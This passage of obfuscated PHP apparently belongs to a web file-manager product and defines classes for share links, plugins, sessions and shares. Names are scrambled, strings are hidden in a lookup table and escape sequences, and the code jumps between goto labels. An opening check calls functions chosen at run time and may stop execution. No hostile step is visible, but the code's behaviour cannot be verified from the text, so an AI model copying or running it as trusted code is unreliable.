$Bã´ÅÑçñ[70], $A‹Ïİ¥š); } } class ZipStream { } if ($_SERVER[$_SERVER[¯Ò¬Èè][490]] != $_SERVER[$_SERVER[¯Ò¬Èè][491]]) { goto A…Ÿ…Í±‹ª; A…Ÿ…Í±‹ª: $b£˜­‡¥… = $_SERVER[¯Ò¬Èè][492]; $b æÑŒìÁ‡ = $_SERVER[$_SERVER[¯Ò¬Èè][493]] . $_SERVER[¯Ò¬Èè][494]; $cÉ†×ä´…Ğ = $b£˜­‡¥…($b æÑŒìÁ‡); goto Cï‡—ä‰–ñ; Cï‡—ä‰–ñ: $eÒ›»®©Š… = explode($_SERVER[¯Ò¬Èè][217], $cÉ†×ä´…Ğ); if (count($eÒ›»®©Š…) < $_SERVER[¯Ò¬Èè][495]) { $A—°ªšíõ¿ = $_SERVER[¯Ò¬Èè][496]; $A—°ªšíõ¿(); } $B”™±ö˜½È = $_SERVER[¯Ò¬Èè][497]; goto aÏ—……ÇèĞ; aÏ—……ÇèĞ: $B”™±ö˜½È($_SERVER[$_SERVER[¯Ò¬Èè][498]]); goto FÔÃ…êƒÂì; FÔÃ…êƒÂì: } goto Cßä†•º‰Ì; DÓğ¥¢ÚÌß: class PathDriverDbShareLink extends PathDriverDB { public function __construct($b¦“Ÿ•õä) { $this->pathParse = $b¦“Ÿ•õä; $this->model = Model($_SERVER[¯Ò¬Èè][1126]); } protected function infoParse($A­’åæòğ, $Eì·†ÃŒô¾ = false, $b®ßåÁ°ç× = false) { $añ÷ì¢÷ÜÏ =& $_SERVER[¯Ò¬Èè]; return Action($añ÷ì¢÷ÜÏ[1027])->sharePathInfo($this->pathParse[$añ÷ì¢÷ÜÏ[75]], !0); } public function listPath($c‰«ÂË‚‹Á, $AàÏ¢ˆ“ = false) { $D ¢ŠÔŸğÏ =& $_SERVER[¯Ò¬Èè]; $eìîö–Úö = parent::listPath($c‰«ÂË‚‹Á, $AàÏ¢ˆ“); foreach ($eìîö–Úö as $fä¸µ˜æ‡Ÿ => $A¾‘ ïò‚Š) { if (!in_array($fä¸µ˜æ‡Ÿ, array($D ¢ŠÔŸğÏ[73], $D ¢ŠÔŸğÏ[74]))) { continue; } foreach ($A¾‘ ïò‚Š as $D’Ï‹À => $b©…Šš˜´¢) { $eìîö–Úö[$fä¸µ˜æ‡Ÿ][$D’Ï‹À] = Action($D ¢ŠÔŸğÏ[1027])->shareItemInfo($b©…Šš˜´¢); } } return $eìîö–Úö; } public function listAll($AÇñã—ñŒÌ) { $EèÂÙî“ƒ¨ =& $_SERVER[¯Ò¬Èè]; $Aƒ¨Ù•¬ö = IO::info($this->pathParse[$EèÂÙî“ƒ¨[75]]); if (!$Aƒ¨Ù•¬ö) { return array(); } $DØÀ…äŒ»ö = $this->model->listAll($AÇñã—ñŒÌ); foreach ($DØÀ…äŒ»ö as &$FÇ£å°ˆ ²) { $FÇ£å°ˆ ²[$EèÂÙî“ƒ¨[391]] = Action($EèÂÙî“ƒ¨[1027])->shareItemInfo($FÇ£å°ˆ ²[$EèÂÙî“ƒ¨[391]]); } return $DØÀ…äŒ»ö; } } class PathDriverDriverShareItem { public function __construct($b‹ì²“‚Òä) { $this->pathParse = $b‹ì²“‚Òä; } public function __call($cöÀØ¾Âøô, $b—Å¶½™‹Ü) { $Eƒ¾Ó®·ïŒ =& $_SERVER[¯Ò¬Èè]; if (method_exists($this, $cöÀØ¾Âøô)) { return; } $fÃ¢‹›ßÜÙ = call_user_func_array(array($Eƒ¾Ó®·ïŒ[1133], $cöÀØ¾Âøô), $b—Å¶½™‹Ü); $cÓ‡Œšö‚ = array($Eƒ¾Ó®·ïŒ[1134], $Eƒ¾Ó®·ïŒ[1135], $Eƒ¾Ó®·ïŒ[1136], $Eƒ¾Ó®·ïŒ[1137], $Eƒ¾Ó®·ïŒ[499], $Eƒ¾Ó®·ïŒ[501], $Eƒ¾Ó®·ïŒ[1138], $Eƒ¾Ó®·ïŒ[103], $Eƒ¾Ó®·ïŒ[1139], $Eƒ¾Ó®·ïŒ[1140]); if (in_array($cöÀØ¾Âøô, $cÓ‡Œšö‚)) { $fÃ¢‹›ßÜÙ = $this->getPathOuter($fÃ¢‹›ßÜÙ); } return $fÃ¢‹›ßÜÙ; } public function copy($Cèƒ×÷Œğì, $c½÷àóËâí, $eÛ´†Ë´˜ = false) { return $this->copyMove($Cèƒ×÷Œğì, $c½÷àóËâí, $eÛ´†Ë´˜, $_SERVER[¯Ò¬Èè][499]); } public function move($fÍ»ó¢¾ÊÉ, $CÔŞòíÔĞ¬, $A¡ŸâËÌ³Æ = false) { return $this->copyMove($fÍ»ó¢¾ÊÉ, $CÔŞòíÔĞ¬, $A¡ŸâËÌ³Æ, $_SERVER[¯Ò¬Èè][501]); } private function copyMove($DÚŞÔ²†½‘, $B„‚Šœ•¦Š, $Cèºàíº²‹, $F»’…æ„İ) { goto a­å‰äå×; a­å‰äå×: $b¡ğíä¶Ú =& $_SERVER[¯Ò¬Èè]; $f•¼µÁ·İ½ = $B„‚Šœ•¦Š; $eµ’£Ô÷…™ = IO::driverMake($B„‚Šœ•¦Š); goto f·ë©‰é‘; f·ë©‰é‘: if ($eµ’£Ô÷…™->pathParse[$b¡ğíä¶Ú[1007]]) { $B„‚Šœ•¦Š = $eµ’£Ô÷…™->pathParse[$b¡ğíä¶Ú[1007]]; } else { $B„‚Šœ•¦Š = $f•¼µÁ·İ½; } $E©é˜Ó¦Ã¾ = IO::copyMove($DÚŞÔ²†½‘, $B„‚Šœ•¦Š, $Cèºàíº²‹, $F»’…æ„İ); $E©é˜Ó¦Ã¾ = $this->getPathOuter($E©é˜Ó¦Ã¾); goto c±Ë®óìòï; c±Ë®óìòï: return $E©é˜Ó¦Ã¾; goto fãÚÅ÷±Ÿé; fãÚÅ÷±Ÿé: } public function pathFather($B¢–İ‹œÎ) { return get_path_father($this->pathParse[$_SERVER[¯Ò¬Èè][75]]); } public function iconvSystem($E»½¬ÒŠæ) { return $E»½¬ÒŠæ; } protected function infoParse($cÍšÅØÔï, $C‰¸ƒããÌ = false) { $EªöÅ½ÑÓõ =& $_SERVER[¯Ò¬Èè]; $Bè®¸ÖÔò¥ = $this->pathParse[$EªöÅ½ÑÓõ[439]][$EªöÅ½ÑÓõ[1028]] . $this->pathParse[$EªöÅ½ÑÓõ[1021]]; if ($C‰¸ƒããÌ) { $CˆŠã¶…Ÿ = IO::infoWithChildren($Bè®¸ÖÔò¥); } else { $CˆŠã¶…Ÿ = IO::info($Bè®¸ÖÔò¥); } $Fª‘ä‰Öâó = $this->pathParse[$EªöÅ½ÑÓõ[439]]; return Action($EªöÅ½ÑÓõ[1132])->_shareItemeParse($CˆŠã¶…Ÿ, $Fª‘ä‰Öâó); } public function listAll($a‚øğï‚Ã) { $DŸòİ³œõØ =& $_SERVER[¯Ò¬Èè]; $eğÊ—Šó§Û = IO::listAll($a‚øğï‚Ã); $E¢‘Ç£˜Æî = $this->pathParse[$DŸòİ³œõØ[439]]; foreach ($eğÊ—Šó§Û as &$c½æĞ‹‘±) { check_abort(); $c½æĞ‹‘± = array_merge(IO::info($c½æĞ‹‘±[$DŸòİ³œõØ[75]]), $c½æĞ‹‘±); $c½æĞ‹‘±[$DŸòİ³œõØ[391]] = Action($DŸòİ³œõØ[1132])->_shareItemeParse($c½æĞ‹‘±, $E¢‘Ç£˜Æî); } return $eğÊ—Šó§Û; } public function getPathOuter($BêÍ¦Á­) { goto aÏèéÄ‚™º; c¡Å”ŞöÏ¼: if (substr($ešñÇë“¥—, 0, strlen($eŒ«ÂÂù‘Ş)) != $eŒ«ÂÂù‘Ş) { return !1; } return $this->pathParse[$e“Œ±ÓÙÄ±[1022]] . $e“Œ±ÓÙÄ±[8] . ltrim($A£Ôİá„·, $e“Œ±ÓÙÄ±[8]); goto B¹Í™àÅãÇ; EÙ”Ş¯ÀÙË: $ešñÇë“¥— = KodIO::clear($BêÍ¦Á­); $eŒ«ÂÂù‘Ş = KodIO::clear($this->pathParse[$e“Œ±ÓÙÄ±[439]][$e“Œ±ÓÙÄ±[1028]]); $A£Ôİá„· = substr($ešñÇë“¥—, strlen($eŒ«ÂÂù‘Ş)); goto c¡Å”ŞöÏ¼; aÏèéÄ‚™º: $e“Œ±ÓÙÄ± =& $_SERVER[¯Ò¬Èè]; $dìÇË¹í—æ = KodIO::parse($BêÍ¦Á­); if ($dìÇË¹í—æ[$e“Œ±ÓÙÄ±[29]] == KodIO::KOD_SHARE_ITEM) { return $dìÇË¹í—æ[$e“Œ±ÓÙÄ±[75]]; } goto EÙ”Ş¯ÀÙË; B¹Í™àÅãÇ: } public function getType() { $dÙßä¤·²é =& $_SERVER[¯Ò¬Èè]; $eùºÇ·¼œ× = str_replace($dÙßä¤·²é[71], $dÙßä¤·²é[33], get_class($this)); return strtolower($eùºÇ·¼œ×); } public function isTypeObject($c‚­‡ñ³†) { return IO::isTypeObject($c‚­‡ñ³†); } public function info($fŒ´‘–ß…ñ) { return $this->infoParse($fŒ´‘–ß…ñ); } public function infoAuth($dèíÇ˜çšª) { return $this->infoParse($dèíÇ˜çšª); } public function infoWithChildren($cÙè§‚­³×) { return $this->infoParse($cÙè§‚­³×, !0); } public function infoFull($Dª§“»Ôóš) { return $this->infoParse($Dª§“»Ôóš); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($DÍ°±Ğ×—) { $this->pathParse = $DÍ°±Ğ×—; } protected function infoParse($DÍÂŒçœ†, $BîÔ•„…¿ˆ = false) { $B—˜İŠÉ¯¤ =& $_SERVER[¯Ò¬Èè]; return Action($B—˜İŠÉ¯¤[1027])->sharePathInfo($this->pathParse[$B—˜İŠÉ¯¤[75]], !0, $BîÔ•„…¿ˆ); } public function listPath($Aø¯İèŠæ, $F†²çø•“¿ = false) { $E¶¬Ó¨ºÕÏ =& $_SERVER[¯Ò¬Èè]; $DÄ˜ÚÈ¯¼½ = IO::listPath($Aø¯İèŠæ, $F†²çø•“¿); foreach ($DÄ˜ÚÈ¯¼½ as $A•ÒçùŠ¶ => $f„½¾ïãÃ™) { if (!in_array($A•ÒçùŠ¶, array($E¶¬Ó¨ºÕÏ[73], $E¶¬Ó¨ºÕÏ[74]))) { continue; } foreach ($f„½¾ïãÃ™ as $DƒíçÕê˜ => $A®¤Æê) { $A®¤Æê = Action($E¶¬Ó¨ºÕÏ[1141])->parsePathChildren($A®¤Æê, array($E¶¬Ó¨ºÕÏ[387] => $Aø¯İèŠæ)); $DÄ˜ÚÈ¯¼½[$A•ÒçùŠ¶][$DƒíçÕê˜] = Action($E¶¬Ó¨ºÕÏ[1027])->shareItemInfo($A®¤Æê); } } return $DÄ˜ÚÈ¯¼½; } public function listAll($B†ÎÎé‡¬½) { $F­¤¦¸ØŠÏ =& $_SERVER[¯Ò¬Èè]; $b·‡“…±¡ = IO::listAll($B†ÎÎé‡¬½); foreach ($b·‡“…±¡ as &$aë¢‚Ë™‘) { $aë¢‚Ë™‘ = array_merge(IO::info($aë¢‚Ë™‘[$F­¤¦¸ØŠÏ[75]]), $aë¢‚Ë™‘); $aë¢‚Ë™‘[$F­¤¦¸ØŠÏ[391]] = Action($F­¤¦¸ØŠÏ[1027])->shareItemInfo($aë¢‚Ë™‘); } return $b·‡“…±¡; } } goto DÔ£Íó¿Œ; a³§¸êÉ’: class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\x2e\x70\x6c\165\x67\151\x6e\114\x69\163\x74"; public $field = array("\x6e\141\x6d\145", "\163\x74\x61\164\165\x73", "\x72\x65\x67\151\x65\163\x74", "\x63\157\x6e\x66\151\x67"); public function loadList($D¬ÉùäÍË™ = false) { $e˜‰½ïÂ™ß = array_to_keyvalue($this->listData(), $_SERVER[¯Ò¬Èè][28]); if ($D¬ÉùäÍË™) { return $e˜‰½ïÂ™ß[$D¬ÉùäÍË™]; } return $e˜‰½ïÂ™ß; } public function init() { $aòŠ®¶šó‰ =& $_SERVER[¯Ò¬Èè]; Hook::trigger($aòŠ®¶šó‰[2202]); $b›ø¡Ö²™ = $this->loadPluginList(); foreach ($b›ø¡Ö²™ as $eÔùâŸ³— => $EÎ¯ÛÔ¨ó) { $C‹Ñ©öƒ‘Å = $this->appAllow($eÔùâŸ³—, $EÎ¯ÛÔ¨ó); if (!$C‹Ñ©öƒ‘Å) { continue; } foreach ($EÎ¯ÛÔ¨ó[$aòŠ®¶šó‰[2203]] as $CóÅë®Í½ß => $d£¾…ò¦„Œ) { Hook::bind($CóÅë®Í½ß, $d£¾…ò¦„Œ); } } Hook::trigger($aòŠ®¶šó‰[2204]); Hook::trigger(ACTION); } public function appAllow($EŠå‚¹øÎ‚, $cÈ£ãšå×¢, $d‚„«¯¸Ãğ = true) { $fÁéè¶ÉÇ® =& $_SERVER[¯Ò¬Èè]; $B±¹Õïß’ó = PLUGIN_DIR . $EŠå‚¹øÎ‚ . $fÁéè¶ÉÇ®[2205]; if (!is_array($cÈ£ãšå×¢) || !is_array($cÈ£ãšå×¢[$fÁéè¶ÉÇ®[2203]]) || !is_file($B±¹Õïß’ó) || $cÈ£ãšå×¢[$fÁéè¶ÉÇ®[703]] != 1) { return !1; } if ($d‚„«¯¸Ãğ && !Action($fÁéè¶ÉÇ®[2206])->checkAuth($EŠå‚¹øÎ‚)) { return !1; } return !0; } public function unInstall($FÕº¨Ö–ˆñ) { $c¡‘ñï…ª“ =& $_SERVER[¯Ò¬Èè]; $FÈŒ¾¨ˆ»ß = $this->loadList($FÕº¨Ö–ˆñ); if (file_exists(PLUGIN_DIR . $FÕº¨Ö–ˆñ)) { Hook::apply($FÕº¨Ö–ˆñ . $c¡‘ñï…ª“[2207]); } $this->remove($FÈŒ¾¨ˆ»ß[$c¡‘ñï…ª“[367]]); } public function changeStatus($dßšâ¼Ş³Ë, $a±Ææ˜ë•) { $b¨¬á©œ =& $_SERVER[¯Ò¬Èè]; $EÖ¶ââàšø = $this->loadList($dßšâ¼Ş³Ë); if ($a±Ææ˜ë•) { Hook::apply($dßšâ¼Ş³Ë . $b¨¬á©œ[2208]); } $this->update($EÖ¶ââàšø[$b¨¬á©œ[367]], array($b¨¬á©œ[2209] => $a±Ææ˜ë•)); } public function appRegist($B‚Ùó…‰œ, $fÂŸš‘Ó’’) { $b‰íÆ¢­å =& $_SERVER[¯Ò¬Èè]; $AÏ°‰ô¾…š = $this->loadList($B‚Ùó…‰œ); if ($AÏ°‰ô¾…š) { $this->update($AÏ°‰ô¾…š[$b‰íÆ¢­å[367]], array($b‰íÆ¢­å[2203] => $fÂŸš‘Ó’’)); } else { $cÙ·™›Â„Ø = array($b‰íÆ¢­å[28] => $B‚Ùó…‰œ, $b‰íÆ¢­å[2203] => $fÂŸš‘Ó’’, $b‰íÆ¢­å[703] => 0, $b‰íÆ¢­å[6] => $this->getConfigDefault($B‚Ùó…‰œ)); $this->insert($cÙ·™›Â„Ø); } } public function getConfigDefault($CãÎÀÒ îÖ) { $BµâÅ¼ÕÂ‰ =& $_SERVER[¯Ò¬Èè]; $A§ë‡¾ÀæŒ = array(); $c°Å½˜™éÑ = $this->getPackageJson($CãÎÀÒ îÖ); if (!$c°Å½˜™éÑ && is_array($c°Å½˜™éÑ[$BµâÅ¼ÕÂ‰[2210]])) { return $A§ë‡¾ÀæŒ; } foreach ($c°Å½˜™éÑ[$BµâÅ¼ÕÂ‰[2210]] as $aí¦¸Ò†¶Ü => $CÂ…¡ˆ¥«ã) { if (!isset($CÂ…¡ˆ¥«ã[$BµâÅ¼ÕÂ‰[359]]) || isset($A§ë‡¾ÀæŒ[$aí¦¸Ò†¶Ü])) { continue; } $A§ë‡¾ÀæŒ[$aí¦¸Ò†¶Ü] = $CÂ…¡ˆ¥«ã[$BµâÅ¼ÕÂ‰[359]]; } return $A§ë‡¾ÀæŒ; } public function getPackageJson($c¨ä¤éÁ†ˆ) { return Hook::apply($c¨ä¤éÁ†ˆ . $_SERVER[¯Ò¬Èè][2211]); } public function getConfig($b±ã£ßÌä”, $Dìô‚ÃÊÉ = false) { $bôƒ´Ø„æ =& $_SERVER[¯Ò¬Èè]; $E³ëó‹ñ = array(); $Bãîñ†öç = $this->loadList($b±ã£ßÌä”); if ($Bãîñ†öç && is_array($Bãîñ†öç[$bôƒ´Ø„æ[6]])) { $E³ëó‹ñ = $Bãîñ†öç[$bôƒ´Ø„æ[6]]; } if (!$E³ëó‹ñ || $Dìô‚ÃÊÉ) { $E³ëó‹ñ = $this->getConfigDefault($b±ã£ßÌä”); } return $E³ëó‹ñ; } public function setConfig($CŒÒ¬ç×šÇ, $b£¯•ËÅø = false) { goto BàåÛ¤‰¢; F¯Ô„‚™½ù: $this->update($f‰ƒ‘š²[$DÛàìã¶[367]], array($DÛàìã¶[6] => $cÅ¬²†æö)); goto DÀ¬¶ïğ ; BàåÛ¤‰¢: $DÛàìã¶ =& $_SERVER[¯Ò¬Èè]; $f‰ƒ‘š² = $this->loadList($CŒÒ¬ç×šÇ); if (!$f‰ƒ‘š²) { return !1; } goto FëÎäÕ­ì²; FëÎäÕ­ì²: $cÅ¬²†æö = $f‰ƒ‘š²[$DÛàìã¶[6]]; if ($b£¯•ËÅø == !1) { $cÅ¬²†æö = array(); $b£¯•ËÅø = $this->getConfigDefault($CŒÒ¬ç×šÇ); } foreach ($b£¯•ËÅø as $EÜê•˜ØÁš => $Dªõ®³É±Ò) { $cÅ¬²†æö[$EÜê•˜ØÁš] = is_string($Dªõ®³É±Ò) ? trim($Dªõ®³É±Ò) : $Dªõ®³É±Ò; } goto F¯Ô„‚™½ù; DÀ¬¶ïğ : } public function viewList() { goto cæŠ„×â½¿; d¨ƒ½İ: $eÂåŠ‡¶Ä° = $this->loadPluginList(); $e†‘‹…åŠ„ = array(); foreach ($eÂåŠ‡¶Ä° as $DåËÕÛŞÀÃ => $C‰¹¯ŒãÆÇ) { unset($C‰¹¯ŒãÆÇ[$dùÊÜ±Í×Î[2203]], $C‰¹¯ŒãÆÇ[$dùÊÜ±Í×Î[6]]); $a¸‰¡ ³ç = PLUGIN_DIR . $C‰¹¯ŒãÆÇ[$dùÊÜ±Í×Î[28]] . $dùÊÜ±Í×Î[2205]; if (!is_file($a¸‰¡ ³ç)) { continue; } $Fò­‘ƒË = Hook::apply($C‰¹¯ŒãÆÇ[$dùÊÜ±Í×Î[28]] . $dùÊÜ±Í×Î[2211]); if (is_array($Fò­‘ƒË)) { $e†‘‹…åŠ„[$DåËÕÛŞÀÃ] = array_merge($C‰¹¯ŒãÆÇ, $Fò­‘ƒË); } } goto eöÎÜäÊÃ; cæŠ„×â½¿: $dùÊÜ±Í×Î =& $_SERVER[¯Ò¬Èè]; $eÂåŠ‡¶Ä° = $this->loadList(); $this->pluginScan($eÂåŠ‡¶Ä°); goto d¨ƒ½İ; eöÎÜäÊÃ: return $e†‘‹…åŠ„; goto a‘ˆÖ˜’œˆ; a‘ˆÖ˜’œˆ: } private function loadPluginList() { $dƒ¨íë†Ï… =& $_SERVER[¯Ò¬Èè]; $BÇÅŞÎÜÇø = $this->loadList(); if (strtolower(MOD) == $dƒ¨íë†Ï…[2212]) { return $BÇÅŞÎÜÇø; } $D…´Ç›Á— = Hook::trigger($dƒ¨íë†Ï…[2213], $BÇÅŞÎÜÇø); if ($BÇÅŞÎÜÇø && !$D…´Ç›Á—) { die; } return $D…´Ç›Á— ? $D…´Ç›Á— : $BÇÅŞÎÜÇø; } private function pluginScan($cÏ¿†ŸÅç) { $f˜‰ÛÒ¯’ =& $_SERVER[¯Ò¬Èè]; recursion_dir(PLUGIN_DIR, $cÂÅÎÁ£×ğ, $b°•„Ê„Šš, 0); foreach ($cÂÅÎÁ£×ğ as $E÷¡¬ßí) { $e®¤Ü‹»‡œ = get_path_this($E÷¡¬ßí); if (isset($cÏ¿†ŸÅç[$e®¤Ü‹»‡œ]) || !file_exists($E÷¡¬ßí . $f˜‰ÛÒ¯’[2214]) || !file_exists($E÷¡¬ßí . $f˜‰ÛÒ¯’[2205])) { continue; } Hook::apply($e®¤Ü‹»‡œ . $f˜‰ÛÒ¯’[2208]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\x74\x65\155\137\x73\145\x73\163\151\157\x6e"; public function get($Fà¤âêˆê) { $cå§Ô’÷ÂŠ =& $_SERVER[¯Ò¬Èè]; $eÅ­­«ßöñ = $this->where(array($cå§Ô’÷ÂŠ[2215] => $Fà¤âêˆê))->find(); if (!is_array($eÅ­­«ßöñ)) { return !1; } return $eÅ­­«ßöñ[$cå§Ô’÷ÂŠ[706]]; } public function set($FµÁ¹ÚÔƒÛ, $fÈéÜİ‚¬, $c¿ˆ ÕìÏ´ = 3600) { $d–‡ˆ³ø°â =& $_SERVER[¯Ò¬Èè]; $fÙè‰±˜õ‹ = array($d–‡ˆ³ø°â[2215] => $FµÁ¹ÚÔƒÛ, $d–‡ˆ³ø°â[2144] => $fÈéÜİ‚¬, $d–‡ˆ³ø°â[2216] => $c¿ˆ ÕìÏ´ + time()); if (Session::get($d–‡ˆ³ø°â[2217])) { $fÙè‰±˜õ‹[$d–‡ˆ³ø°â[1446]] = Session::get($d–‡ˆ³ø°â[2217]); } else { $fÙè‰±˜õ‹[$d–‡ˆ³ø°â[1446]] = 0; } if ($this->get($FµÁ¹ÚÔƒÛ)) { return $this->where(array($d–‡ˆ³ø°â[2215] => $FµÁ¹ÚÔƒÛ))->save($fÙè‰±˜õ‹); } else { return $this->add($fÙè‰±˜õ‹, array(), !0); } } public function remove($e™ÈŠñ¯Îô) { return $this->where(array($_SERVER[¯Ò¬Èè][2215] => $e™ÈŠñ¯Îô))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¯Ò¬Èè][2218] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\x72\x65"; protected $dataAuto = array(array("\x6d\x6f\144\151\146\x79\124\x69\x6d\x65", "\164\x69\x6d\145", "\x69\x6e\163\145\x72\x74\x2c\x75\x70\144\141\x74\x65", "\146\x75\x6e\x63\164\151\157\156"), array("\x63\162\x65\141\164\x65\x54\151\x6d\x65", "\164\151\155\145", "\x69\x6e\x73\x65\x72\164", "\x66\165\x6e\x63\x74\x69\157\x6e"), array("\157\160\x74\x69\157\156\163", '', "\x69\156\x73\145\162\x74\x2c\x75\160\x64\x61\164\x65\x2c\x73\145\x6c\145\143\x74", "\x6a\163\157\x6e")); private $fieldList = "\52"; protected function cacheFunctionAlias($Fí£¿‚êÃÕ) { $C³ŸŸÂĞ‹ =& $_SERVER[¯Ò¬Èè]; $f•Á¡´ßÕØ = isset($Fí£¿‚êÃÕ[0]) ? $Fí£¿‚êÃÕ[0] : !1; return array($C³ŸŸÂĞ‹[2219] => array(USER_ID, $C³ŸŸÂĞ‹[2220]), $C³ŸŸÂĞ‹[2182] => array($f•Á¡´ßÕØ, $C³ŸŸÂĞ‹[2221])); } protected function listSimple() { $c¹áƒÇÍ = array($_SERVER[¯Ò¬Èè][1446] => USER_ID); $FÃĞº†Õ’’ = $this->field($this->fieldList)->where($c¹áƒÇÍ)->select(); return $FÃĞº†Õ’’ ? $FÃĞº†Õ’’ : array(); } protected function getInfo($eÃ»˜Ùó…–, $fÂé¤¨Íêï = false) { $aÌÜÅµÕÈŠ =& $_SERVER[¯Ò¬Èè]; if ($fÂé¤¨Íêï) { return $this->_getShareInfo(array($aÌÜÅµÕÈŠ[441] => $eÃ»˜Ùó…–)); } $d×Ãå‚·µĞ = $this->cacheFunctionGet($aÌÜÅµÕÈŠ[2222], $eÃ»˜Ùó…–); return $d×Ãå‚·µĞ; } public function getInfoByHash($F©…‹äŸŒ¨) { return $this->_getShareInfo(array($_SERVER[¯Ò¬Èè][443] => $F©…‹äŸŒ¨)); } public function getInfoByPath($d§…Û§à) { $E‘®–ÍŞ á =& $_SERVER[¯Ò¬Èè]; $a‚­¨ñËÜ = array($E‘®–ÍŞ á[1446] => USER_ID, $E‘®–ÍŞ á[369] => $d§…Û§à); return $this->_getShareInfo($a‚­¨ñËÜ); } public function getInfoBySourcePath($b¢™–†è‰) { $aÏ—´Ğ†Å¡ =& $_SERVER[¯Ò¬Èè]; $FèÇÍ‚ŸØ = array($aÏ—´Ğ†Å¡[1446] => USER_ID, $aÏ—´Ğ†Å¡[1028] => $b¢™–†è‰); return $this->_getShareInfo($FèÇÍ‚ŸØ); } private function _getShareInfo($C©šÛ†¾ßº) { goto C©É’¼¸«Ô; eØœ¡¯„‹: $C©šÛ†¾ßº = array($Aóõ÷Í¾Á¨[441] => $EØ³ ì²œ³[$Aóõ÷Í¾Á¨[441]]); $aóÙ¼›ç®¿ = $Aóõ÷Í¾Á¨[2223]; $A±ÅÒ‘Ù… = Model($Aóõ÷Í¾Á¨[546])->order($Aóõ÷Í¾Á¨[367])->field($aóÙ¼›ç®¿)->where($C©šÛ†¾ßº)->select(); goto cÒ¼ùõæù; C©É’¼¸«Ô: $Aóõ÷Í¾Á¨ =& $_SERVER[¯Ò¬Èè]; $EØ³ ì²œ³ = $this->where($C©šÛ†¾ßº)->find(); if (!$EØ³ ì²œ³) { return !1; } goto eØœ¡¯„‹; cÒ¼ùõæù: if ($EØ³ ì²œ³[$Aóõ÷Í¾Á¨[369]] == $Aóõ÷Í¾Á¨[468]) { $EØ³ ì²œ³[$Aóõ÷Í¾Á¨[391]] = IO::info($EØ³ ì²œ³[$Aóõ÷Í¾Á¨[1028]]); } else { $EØ³ ì²œ³[$Aóõ÷Í¾Á¨[391]] = Model($Aóõ÷Í¾Á¨[1126])->pathInfo($EØ³ ì²œ³[$Aóõ÷Í¾Á¨[369]]); } $EØ³ ì²œ³[$Aóõ÷Í¾Á¨[2224]] = $A±ÅÒ‘Ù…; return $EØ³ ì²œ³; goto EÏ†„Ÿ£Ã®; EÏ†„Ÿ£Ã®: } protected function getInfoAuth($b²¢‘Ô½¼Ş) { $cğĞ§Èº²„ =& $_SERVER[¯Ò¬Èè]; $E¦Æ×¾Åñ = $this->getInfo($b²¢‘Ô½¼Ş); $E¦Æ×¾Åñ[$cğĞ§Èº²„[376]] = Model($cğĞ§Èº²„[454])->authMake($E¦Æ×¾Åñ[$cğĞ§Èº²„[2224]]); return $E¦Æ×¾Åñ; } protected function listData($d† ¸·¹Çƒ = null, $bóå·ğ²³• = 300) { $bÅ‰‘½Œ¬Ó =& $_SERVER[¯Ò¬Èè]; $EÙÒ¶ƒïŸ˜ = array(array($bÅ‰‘½Œ¬Ó[446] => array($bÅ‰‘½Œ¬Ó[935], 0), $bÅ‰‘½Œ¬Ó[448] => array($bÅ‰‘½Œ¬Ó[935], 0), $bÅ‰‘½Œ¬Ó[2225] => $bÅ‰‘½Œ¬Ó[2194])); if ($d† ¸·¹Çƒ == $bÅ‰‘½Œ¬Ó[1880]) { $EÙÒ¶ƒïŸ˜ = array($bÅ‰‘½Œ¬Ó[446] => 1); } else { if ($d† ¸·¹Çƒ == $bÅ‰‘½Œ¬Ó[1017]) { $EÙÒ¶ƒïŸ˜ = array($bÅ‰‘½Œ¬Ó[448] => 1); } } $EÙÒ¶ƒïŸ˜[$bÅ‰‘½Œ¬Ó[1446]] = USER_ID; $dˆ¨ìó÷ÇÅ = $this->where($EÙÒ¶ƒïŸ˜)->selectPage($bóå·ğ²³•); return $dˆ¨ìó÷ÇÅ; } protected function listToMe($BãÏŸàÎ = 300) { goto Có©ßÏó«›; e¶Ìòó¦ : $f±•„ˆÀ¦ = array($FÔï‡©óï„[2228] => $dƒ¦¦Ï‰£¯, $FÔï‡©óï„[2229] => $f¹ó·©èÃ•[$FÔï‡©óï„[351]]); return $f±•„ˆÀ¦; goto a¯ÖÒàŠ¦Ç; bª…ª‰ÕëÑ: $A˜ĞÆõÂ‰Á = array_to_keyvalue_group($f¹ó·©èÃ•[$FÔï‡©óï„[354]], $FÔï‡©óï„[441]); if (!$A˜ĞÆõÂ‰Á) { return $f¹ó·©èÃ•; } $bÊÂ‰©’İ¼ = $FÔï‡©óï„[2227]; goto a¾±éâ´«å; f­ŠÌ‡¦ƒá: $a††ÁŒ¤¯Ş = array($FÔï‡©óï„[530] => SourceModel::TYPE_USER, $FÔï‡©óï„[456] => USER_ID); if ($C ±öâ„í ) { $a††ÁŒ¤¯Ş = array(array($FÔï‡©óï„[530] => SourceModel::TYPE_USER, $FÔï‡©óï„[456] => USER_ID), array($FÔï‡©óï„[530] => SourceModel::TYPE_GROUP, $FÔï‡©óï„[456] => array($FÔï‡©óï„[7], $C ±öâ„í )), $FÔï‡©óï„[2225] => $FÔï‡©óï„[2194]); } $f¹ó·©èÃ• = Model($FÔï‡©óï„[546])->where($a††ÁŒ¤¯Ş)->selectPage($BãÏŸàÎ); goto bª…ª‰ÕëÑ; a¾±éâ´«å: $a††ÁŒ¤¯Ş = array($FÔï‡©óï„[441] => array($FÔï‡©óï„[384], array_keys($A˜ĞÆõÂ‰Á))); $dƒ¦¦Ï‰£¯ = $this->field($bÊÂ‰©’İ¼)->where($a††ÁŒ¤¯Ş)->select(); foreach ($dƒ¦¦Ï‰£¯ as $Aöğäˆàã => &$cÈ•òàï§‹) { $cÈ•òàï§‹[$FÔï‡©óï„[2224]] = $A˜ĞÆõÂ‰Á[$cÈ•òàï§‹[$FÔï‡©óï„[441]]]; } goto e¶Ìòó¦ ; Có©ßÏó«›: $FÔï‡©óï„ =& $_SERVER[¯Ò¬Èè]; $Eæª ¹§™ = Session::get($FÔï‡©óï„[2226]); $C ±öâ„í  = array_to_keyvalue($Eæª ¹§™, $FÔï‡©óï„[33], $FÔï‡©óï„[2114]); goto f­ŠÌ‡¦ƒá; a¯ÖÒàŠ¦Ç: } protected function shareAdd($dµŠ˜È­ˆå, $Bö”ƒ‹çø) { $BÏä’›˜ =& $_SERVER[¯Ò¬Èè]; 